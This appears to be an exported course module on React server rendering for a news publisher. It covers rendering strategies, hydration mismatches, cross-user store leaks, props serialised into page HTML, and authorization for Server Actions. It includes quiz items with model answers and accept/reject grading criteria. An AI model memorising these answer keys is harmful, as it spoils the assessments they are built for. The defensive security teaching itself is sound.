feedback.elaborativeFeedback: **Model answer.** Mocking the application's own API module replaces the real code with the test author's own belief about what it returns — the test then verifies the component against that belief, never against the actual server response. Since the mock's shape (`amount`) never has to agree with the real API's shape (`amountPence`), a mismatch between the two produces no test failure whatsoever; the test is internally consistent and passes, while production, hitting the real API, fails. The fix is to intercept at the HTTP boundary instead — using something like Mock Service Worker — so the response shape used in tests is the same layer that would surface a real mismatch, and the real fetch, parsing, and error-handling code all remain genuinely exercised. **Accept** any answer correctly identifying that the module mock's shape has no forced relationship to the real API's shape. **Reject** answers proposing more assertions or higher coverage as the fix, since either would still pass against the same incorrect mocked shape.

confidencePrompt.prompt: How confident are you in your answer?

interactionSequence.prompt: **Short answer.** Name three of the six quiet exposure paths from this section, and for one of them, explain specifically why it is easy to miss in an ordinary code review that is looking for obvious security issues.

feedback.elaborativeFeedback: **Model answer.** Any three of: secrets embedded in client-exposed environment variables, sensitive values placed in URLs, over-fetching full records when only a subset of fields is displayed, default telemetry payloads capturing tokens or request bodies, publicly served source maps, and unescaped CSV export enabling formula injection. On why one is easy to miss — a strong example is over-fetching: the frontend code reviewing an API call typically looks correct and unremarkable, since it is only *displaying* a few fields from the response, and nothing in the visible rendering logic hints that the full response, including fields never shown on screen, is nonetheless present in the network payload and readable by anyone inspecting traffic. A reviewer scanning for security issues is usually looking at what is displayed or executed, not at what silently arrived in a response and was simply never rendered. **Accept** any three correct paths with a reasonable explanation of review-blindness for one. **Reject** answers that only list paths without explaining the review-blindness mechanism for at least one.

confidencePrompt.prompt: How confident are you in your answer?

interactionSequence.prompt: **Short answer.** Give the four parts of an Architecture Decision Record, and explain what makes a record specific enough to actually settle a future disagreement, rather than merely documenting that a decision happened.

feedback.elaborativeFeedback: **Model answer.** Context, options considered, decision, and consequences. A record settles a future disagreement only when it states the *specific* trade-off that was actually weighed — naming genuine alternatives with their real downsides, and naming what the chosen option costs, not only what it gains. A record stating only "we chose cookies for security reasons" would not stop a later proposal to switch to local storage, because it gives no reasoning to argue against; a record stating the specific XSS-versus-CSRF trade-off, and why XSS was judged the higher-likelihood risk for this particular application, gives a future reader something concrete to weigh the new proposal against. **Accept** any answer correctly naming all four parts and correctly identifying specificity of the actual trade-off, not merely presence of the four headings, as what makes a record effective. **Reject** answers that treat simply having the four sections filled in as sufficient, without addressing the specificity requirement.

confidencePrompt.prompt: How confident are you in your answer?

retrievalPractice.prompt: Section 7 taught that a route guard is UX, not security. State the more general version of that rule this section taught, and give one example beyond routing.
From memory, name this section's four main topics and one concrete rule from each you could apply to a pull request today.

transferExercises.context: School-district gradebook system — a different domain from the transport-fare examples used throughout this section.
transferExercises.scenario: A gradebook application lets teachers enter grades, department heads approve them before they are finalised, and parents view only published, approved results. The approval action is currently gated by a client-side role check with no corresponding server-side check. Grade data includes free-text teacher comments that are exported to CSV for report generation. The application's entry bundle has grown steadily and has no size check in CI. A recent architectural decision moved draft-grade state from a global store into a URL-based representation, made verbally in a team meeting with no written record.
transferExercises.task: Identify and prioritise the security issue using this section's method, including what you would demonstrate before writing any fix. Assess the CSV export for the same injection risk covered in this section, and specify the fix. Propose a bundle budget approach appropriate for a school application likely to be used on a range of institutional devices. Finally, write the ADR that should have been written for the draft-grade state decision, in the format this section teaches.
successCriteria: Identifies the client-side-only approval gate as the priority security issue, and specifies demonstrating a direct, successful unauthorised approval call before proposing any fix
Proposes a server-side approval check plus explicit client handling of a forbidden response for a department head whose permissions might change mid-session
Identifies the free-text comment field exported to CSV as a formula-injection risk and proposes escaping any leading =, +, -, or @ character
Proposes a blocking bundle budget derived from a stated realistic target device for a school context (older, lower-spec institutional hardware) rather than an arbitrary number

Writes an ADR for the draft-grade-to-URL decision with genuine context (what problem the move solved), at least one real alternative considered, a specific decision, and consequences including what became harder — not merely a restatement of the decision itself

sections.title: Server Rendering Orientation: What Changes When React Runs Somewhere Other Than the Browser
sections.description: The previous ten sections assume a browser downloads a bundle and React boots there. That model is correct for internal consoles behind a login, which is most of what this course has used as examples. It is the wrong model for anything public, and a large share of new React work now starts inside a framework where the server is the default. This is an orientation, not a full framework course: what runs where, and which of your habits from the previous ten sections become bugs. Examples come from a news publisher.

learningObjectives.description: Assign a rendering strategy — CSR, SSR, SSG, or ISR — per route, reasoning from change frequency, personalisation, and discoverability rather than applying one strategy site-wide.
Diagnose a hydration mismatch, name its likely cause, and apply the correct fix in order of preference.
Explain why a module-level store is a cross-user data leak under server rendering, connecting the explanation directly to Section 1's module-evaluation rule.
Identify why data fetched in an effect does not appear in server-rendered output, connecting the explanation to Section 3's effect model.
Explain why props passed to a client component are serialised into the page, and why a Server Action is a public endpoint requiring the same authorization discipline as any other.

motivationHooks.prompt: A publisher moved to client-rendered React and lost 38 percent of organic traffic within two months. Articles were fetched inside `useEffect`, so search crawlers indexed an empty shell and social previews showed no headline at all. Moving to per-route strategies took the time to readable text on a mid-range Android phone from 6.8 seconds to 1.4. Along the way, the team also found a Redux store created at module level leaking a logged-in editor's unpublished draft into an anonymous reader's page, and an API credential serialised into every single article's public HTML — because a Server Component had passed an entire internal response object as a prop to a client component.

Write this down before reading on. A team says: "Our site is server-rendered, so search engines can read our content." Their article component fetches its content inside a `useEffect`. **Is their statement true?** Answer yes or no, and write one sentence explaining why, using only what you already know from Section 3 about when effects run.

This section adds almost no new mechanisms. Its entire content is: apply Section 1's module-evaluation rule, Section 3's effect timing, Section 6's state-tier ownership, and Section 10's client-is-not-a-boundary argument to a second execution environment. If those four ideas are genuinely understood, this section is mostly a matter of recognising familiar shapes in a new setting — which is also, not coincidentally, the fastest way to actually learn something well: seeing it survive a real change of context.

The statement is false, and Section 3 already contains the reason: effects run only after mount, in the browser. On the server, React renders the component tree once, produces HTML, and effects never run at all as part of that process — so a component that fetches its content inside `useEffect` contributes nothing but an empty shell to the server-rendered HTML. The framework genuinely is server-rendering the page; the component itself is opting back out of that benefit by deferring its content to a lifecycle stage the server-rendering pass never reaches. This single misunderstanding is the most common way "we have SSR" ends up delivering no actual benefit.

sectionSummary.content:
You should now believe the following about server rendering.

**Rendering strategy is a decision per route, not per application.** A publisher might reasonably use static generation for articles, incremental regeneration for section fronts, streaming server rendering for a live blog, and client rendering for a subscriber account area — all at once.

**Hydration asserts that the client's first render reproduces the server's HTML exactly.** A mismatch is caused by anything the server could not have known: the current time, randomness, or a browser-only global. Fix it by making the value deterministic first, rendering it after mount second, and suppressing the warning on one specific node only as a last resort.

**Effects do not run on the server.** A component fetching its own content inside `useEffect` produces an empty shell in server-rendered output — the single most common way server rendering silently fails to deliver its main benefit.

**A module-level store is a cross-user data leak on a server**, for exactly the reason Section 1 gave for a plain module-level `Map`: a server process serves many users inside one shared context, so a store created once at module scope is shared by all of them, not private to any one.

**Props passed to a client component are serialised into the page's HTML.** Anything in that object is now public, regardless of whether the client component actually uses it — passing a whole internal response object rather than the specific fields needed is how credentials end up in public page source.

**A Server Action is a public HTTP endpoint**, callable directly by anything that can construct a request, in exactly the sense Section 10 taught for any other endpoint — it needs the same independent, server-side authorization as everything else.

**Server rendering is a trade, not a strict upgrade.** An internal tool behind a login, used only by staff on managed devices, gains essentially none of its benefits while paying real costs in infrastructure and complexity.
keyTakeaways: CSR, SSR, SSG, ISR are chosen per route, not once for the whole site.
Hydration mismatch = anything the server could not know. Fix: determinism, then after-mount rendering, then suppression as a last resort.
Effects do not run during server rendering; fetching in useEffect yields an empty shell.
A module-level store is a cross-user leak on a server — Section 1's rule, unchanged, in a new environment.
Props to a client component are serialised into the page and become public.
A Server Action is a public endpoint and needs its own authorization, exactly like any other endpoint.
SSR is a trade. An internal, authenticated tool usually gains nothing from it.

learningExperiences.title: Four strategies, chosen per route, and hydration mismatches

contentBlocks.caption: Four rendering strategies
rows: In the browser, after the JavaScript bundle loads
Authenticated app shells behind a login
On the server, for each request
At build time, then refreshed periodically in the background
Large content sites where full rebuilds are too slow

contentBlocks.content: **These are per-route decisions, not per-application ones.** A publisher's homepage might be ISR on a 60-second refresh, an individual article SSG with on-demand invalidation when it is edited, a live blog streaming SSR, and the subscriber account area plain CSR behind authentication — all in the same application. Choosing one strategy for a whole site is the first, and most common, mistake.

## Hydration

**Hydration** is the step where React attaches its event handlers and internal state to HTML the server already produced, rather than throwing it away and building the DOM fresh. It asserts something specific: that the client's first render **reproduces the server's HTML exactly**.

A **hydration mismatch** happens when the client's first render differs from what the server sent — caused by anything the server could not have known: `new Date()` or `Math.random()` evaluated independently on each side, a browser-only global like `window`, or a value read from `localStorage`.

Fix in this order: **make the value deterministic** first — pass an explicit value rather than computing something environment-dependent on both sides independently; **render it after mount** second, accepting a brief flash of a placeholder for values that are genuinely client-only; and **suppress the specific warning on one node** only as a last resort, for a difference you have deliberately decided is acceptable.

interactionSequence.prompt: A component renders `{new Date().toLocaleTimeString()}`, evaluated independently on the server during rendering and again on the client during hydration. What is the most likely visible symptom?
options: Nothing — the browser always uses whatever the server sent, with no re-evaluation
A hydration mismatch warning, since the server's render and the client's first render computed the time independently and are very likely to differ by at least a few seconds
The page fails to load entirely
The date displays correctly on the server and is left blank on the client

optionFeedback.feedback: Hydration specifically re-executes the component on the client to attach behaviour — it does not simply trust the server's markup unconditionally, which is precisely why a difference here is detected at all.

Correct. `new Date()` returns a different value each time it is called, so the server's render and the client's independent render are almost certain to disagree — a textbook non-deterministic value causing a mismatch.
A hydration mismatch produces a console warning (and, in some cases, React discarding and re-rendering the affected subtree on the client) — not a page-level failure.
Both renders actually compute a real time value; the two computed values simply do not agree with each other, rather than one side producing nothing.

feedback.elaborativeFeedback: The fix, applying this experience's ordering: pass an explicit, already-fixed timestamp value down as a prop from a single source, computed once, rather than letting each environment independently call `new Date()` — turning a non-deterministic computation into a deterministic one.
hints: Does calling `new Date()` at two different physical moments, on two different machines, tend to return the same value?

interactionSequence.prompt: A component genuinely needs `window.innerWidth` to decide what to render, and this value is only available in the browser. Which fix from this experience applies, and why not the first one in the ordering?
options: Making the value deterministic, by computing a fixed default width on the server
Rendering it after mount — showing a reasonable default or placeholder for the server render and the client's first render, then updating once the real value is read from the browser after mount
Suppressing the hydration warning immediately, since this case is unavoidable
Switching the entire page to client-side rendering

optionFeedback.feedback: This is not really available here — `window` does not exist on the server at all, so there is no way to compute a genuinely correct value there; a fixed placeholder is not the same as a deterministic real value, which is why the next tier of fix applies instead.

Correct. Since the true value is only knowable in the browser, render a safe default for both the server pass and the client's first pass — which are then guaranteed to match — and update to the real value in an effect after mount, when it is finally available.
This is the last-resort option, appropriate only after confirming the first two approaches genuinely do not apply — reaching for it immediately skips two better options that do apply here.

This discards every benefit of server rendering for the entire page merely because one value on it happens to be client-only, which is a disproportionate response to a narrow, well-understood problem.

feedback.elaborativeFeedback: This is the second tier of the fix ordering for a reason: it is not always possible to make an inherently client-only value deterministic on the server, since the true value simply does not exist there yet — but it is almost always possible to agree on a shared, matching placeholder for the brief window before the real value becomes available.
hints: Is `window.innerWidth` a value that could, in principle, be made to agree between server and client — or is it genuinely unavailable on one side?

workedExamples.problem: A news publisher's homepage needs a single strategy assignment across four distinct route types: individual articles, the homepage itself, a live-updating election-results blog, and a subscriber's saved-articles list. Assign a strategy to each and justify.
steps: **Individual articles.** Content changes rarely once published, and search discoverability is the single highest priority — assign static generation, with on-demand regeneration triggered specifically when an article is edited after publication, rather than waiting for a scheduled rebuild.

**The homepage.** Content changes every few minutes as new articles are promoted or reordered, but does not need per-request personalisation — assign incremental regeneration on a short interval, such as 60 seconds, balancing freshness against the cost of a full render on every single request.

**The live election-results blog.** Content changes continuously, sometimes multiple times a minute, and freshness is the entire point of the page — assign server-side rendering per request, ideally with streaming so the page's static shell (navigation, layout) can be sent immediately while the latest results are still being fetched.

**The subscriber's saved-articles list.** Fully personalised per logged-in user, has no search-discoverability value at all since it requires authentication to view, and is behind a login exactly like the internal consoles this course has otherwise used as examples — assign plain client-side rendering.

Confirm the assignment is coherent as a whole: three of the four routes benefit measurably from some form of server involvement, for genuinely different reasons each time (discoverability, freshness-at-scale, real-time freshness), while the fourth gains nothing from it and should not pay its complexity cost.
workedExamples.conclusion: Four routes, four different justifications, and no single strategy would have served all of them well — a uniform 'server-render everything' policy would have added real-time SSR's request-per-load cost to article pages that change once a month, and a uniform 'static-generate everything' policy would have made the live blog useless. The assignment is a genuine per-route engineering decision, not a single project-level setting to be chosen once.

retrievalPractice.prompt: Name the four rendering strategies and one route type each is well suited to.
Give the three fixes for a hydration mismatch, in the correct order of preference, and say when the last one is actually appropriate.

learningExperiences.title: What changes: effects, module-level stores, props, and Server Actions

contentBlocks.caption: Four habits from earlier sections, and what changes about each under server rendering
rows: Effects do not run during server rendering. A component fetching its own content in `useEffect` produces an empty shell in the server-rendered HTML.
A store created at module level is evaluated once per server process, not once per user — the exact rule Section 1 taught, now with a cross-user data leak as the consequence.
There is now a tier above every client-side one: server-rendered data owned by the request itself. Stores holding per-user data must be created per request, not once at module scope.
Section 10 — the client is not a boundary

Props passed to a client component are serialised directly into the page's HTML — the boundary between server and client is now a place secrets can leak, not merely a place permissions can be bypassed.

contentBlocks.content:
## Server Actions are public endpoints

A Server Action looks, in the code, like an ordinary function call from a client component. It is not one — it is a public HTTP endpoint under the hood, callable directly by anything capable of constructing a request, in exactly the sense Section 10 taught for any other API route.

"Only our form calls this" is Section 10's hidden-UI misconception, wearing new clothing. A Server Action needs the same independent, server-side authorization as any other endpoint — its convenient calling syntax on the client side changes nothing about what actually enforces access to it.

interactionSequence.prompt: A publisher's site uses a server-rendering framework throughout. Search crawlers still index an empty shell for every article, and social previews show no headline. Using only Section 3's material, name the most likely cause.
options: The server is too slow, so crawlers are timing out before content arrives
The article's content is fetched inside a `useEffect`, which never runs during the server rendering pass, so the HTML the server actually sends contains no content at all
The framework's server rendering feature is misconfigured or disabled entirely
Crawlers do not support server-rendered pages

optionFeedback.feedback: A slow server would typically produce a slow response, not one that is fast but structurally empty — the symptom described is about content, not timing.

Correct. The framework genuinely is running a server-rendering pass; the component is opting back out of its benefit by deferring content to a lifecycle stage — mount — that the server-rendering pass never reaches at all.
The framework can be doing everything correctly at the infrastructure level while individual components still undermine it through exactly this pattern — the two are independent.
Crawlers read whatever HTML is returned; server-rendered pages are precisely the case they handle best. The problem here is what that HTML actually contains, not whether crawlers can process it.

feedback.elaborativeFeedback: The fastest way to confirm this diagnosis in a real investigation: view the page's raw HTML source directly — not the browser's live element inspector, which shows the DOM *after* hydration and client-side effects have already run and populated it. Source view shows exactly what the server actually sent, which is the only thing a crawler that does not execute JavaScript will ever see.
hints: When, specifically, do effects run relative to a server-side render pass?

interactionSequence.prompt: A Server Component fetches an internal recommendations-service response and passes the entire object as a prop to a client component that only displays two of its fields: `{ ...fullResponse }` rather than `{ title: fullResponse.title, url: fullResponse.url }`. The full response object happens to also include an internal `apiCredentials` field used server-side for a different, unrelated call. What is the consequence, and why?

feedback.elaborativeFeedback: Every prop passed from a Server Component to a client component must be serialised into the page's HTML, so that the client-side JavaScript can reconstruct it during hydration — this is true regardless of which specific fields the receiving client component actually reads or renders. Passing the entire `fullResponse` object means the entire object, including the unused `apiCredentials` field, is serialised into publicly readable page source. Anyone viewing the page's source can read that credential directly, on every single page where this component is used — a real credential exposure caused entirely by passing more data across the boundary than was actually needed, not by any error in the client component's own rendering logic. The fix is to pass only the specific fields genuinely required — `{ title: fullResponse.title, url: fullResponse.url }` — so nothing beyond what is displayed is ever serialised across the boundary at all.

confidencePrompt.prompt: How confident are you in this explanation?

interactionSequence.prompt: In your own words: a colleague argues that a Server Action triggered only by an internal admin form does not need its own authorization check, since "nothing else calls it." Respond, connecting your answer explicitly to Section 10.

feedback.elaborativeFeedback: A strong answer identifies this as the identical argument Section 10 addressed for a hidden refund button and an ordinary API endpoint, restated for a Server Action specifically. Regardless of how conveniently a Server Action is invoked from client code — syntactically resembling a plain function call — it compiles down to a real, addressable HTTP endpoint that anything capable of constructing a request can call directly, entirely bypassing the admin form and whatever assumptions its UI encodes. "Nothing else calls it" describes what the current UI happens to do, not what the server will accept from any other caller; the server must authorize the action independently of which interface — or no interface at all — is responsible for triggering the request.

workedExamples.problem: **The draft leak, reconstructed.** A publisher's article page held a Redux store created at module level, working correctly for two years under client-side rendering. The team adds server rendering, and within a week a logged-in editor's unpublished draft appears briefly on an anonymous reader's page. Diagnose using Section 1's module-evaluation rule specifically.
steps: Recall Section 1's rule directly: a module is evaluated once per JavaScript context. In a browser, each user's tab is its own separate context, so a module-level store has always been, in effect, a private per-user store — safely, for two years, purely as a consequence of the browser's execution model rather than anything the code itself guaranteed.

Identify what changed: a server process handles many different users' requests within one single, shared JavaScript context over its lifetime. The module-level store is evaluated exactly once for that entire process, and every request that process happens to handle shares the same store instance.

Trace the leak precisely: an editor's request populates the shared store with their in-progress, unpublished draft while rendering their own editing view. A short time later, before that server process happens to restart, a different request — this time from an anonymous reader — is handled by the same process, and the rendering code reads from the same still-populated store, embedding the editor's draft content into the reader's response.

Confirm this matches this section's summary table exactly: the code did not change at all between the client-only and server-rendered versions — only the execution environment did, and the module-evaluation rule that made the old environment safe made the new one dangerous, without a single line of the store's own implementation being touched.

State the fix: create the store per request rather than once at module scope, typically via a factory function invoked fresh for each incoming request, with the resulting instance passed down explicitly through that request's own render rather than imported as a shared, ambient singleton.

Note the detection difficulty this shares with Section 1's original meter-telemetry framing: the defect is load-dependent, requiring two requests handled by the same process closely enough in time for one's leftover data to still be present in the store when the second arrives — a condition that low-traffic staging environments are especially likely to never reproduce.
workedExamples.conclusion: The mechanism is identical to Section 1's `Map` example, down to the specific reasoning; only the concrete symptom — a leaked article draft rather than an abstract data structure — differs. This is a useful test of whether Section 1's material actually transferred: recognising the same underlying rule producing a new, more severe consequence in an unfamiliar setting is a stronger sign of real understanding than being able to restate the original rule from memory.
